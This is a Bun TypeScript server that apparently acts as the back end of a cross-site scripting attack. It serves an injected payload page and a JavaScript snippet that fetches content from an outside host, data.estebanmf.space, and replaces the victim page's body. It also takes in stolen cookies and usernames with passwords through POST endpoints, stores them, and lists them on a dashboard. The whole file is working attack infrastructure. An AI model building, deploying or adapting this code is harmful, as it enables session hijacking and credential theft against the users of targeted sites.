import { serve } from "bun";
import { initDB, addCookie, listCookies, addCredential, listCredentials } from "./db";
import { renderPage } from "./html";
import fs from "fs";

await initDB();

serve({
  port: 3000,
  async fetch(req) {
    const url = new URL(req.url);
    const origin = req.headers.get("Origin") || "*"; // Get the requesting origin

    // Serve xss.html for a specific endpoint (e.g., /xss)
    if (url.pathname === "/xss" && req.method === "GET") {
      const xssHtml = fs.readFileSync("xss.html", "utf-8");
      return new Response(xssHtml, {
        headers: {
          "Content-Type": "text/html",
          "Access-Control-Allow-Origin": origin, // Allow the requesting origin
        },
      });
    }

    if (url.pathname === "/js" && req.method === "GET") {
      const jsCode = "fetch('https://data.estebanmf.space/xss').then(t=>t.text()).then(d=>document.body.innerHTML=d)";
      return new Response(jsCode, {
        headers: {
          "Content-Type": "application/javascript",
          "Access-Control-Allow-Origin": origin,
        },
      });
    }

    // POST /cookies
    if (url.pathname === "/cookies" && req.method === "POST") {
      const body = (await req.json().catch(() => null)) as { cookies?: string } | null;
      if (body?.cookies) {
        await addCookie(body.cookies);
        return new Response("Cookies received!", {
          status: 200,
          headers: { "Access-Control-Allow-Origin": origin },
        });
      }
      return new Response("Missing cookies", { status: 400 });
    }

    // POST /credentials
    if (url.pathname === "/credentials" && req.method === "POST") {
      const body = (await req.json().catch(() => null)) as { username?: string; password?: string } | null;
      if (body?.username && body?.password) {
        await addCredential(body.username, body.password);
        return new Response("Credentials received!", {
          status: 200,
          headers: { "Access-Control-Allow-Origin": origin },
        });
      }
      return new Response("Missing username or password", { status: 400 });
    }

    // GET /
    if (url.pathname === "/") {
      const cookies = await listCookies();
      const creds = await listCredentials();
      return new Response(renderPage(cookies, creds), {
        headers: { "Content-Type": "text/html" },
      });
    }

    return new Response("Not found", { status: 404 });
  },
});

console.log("🚀 Server running at http://localhost:3000/");
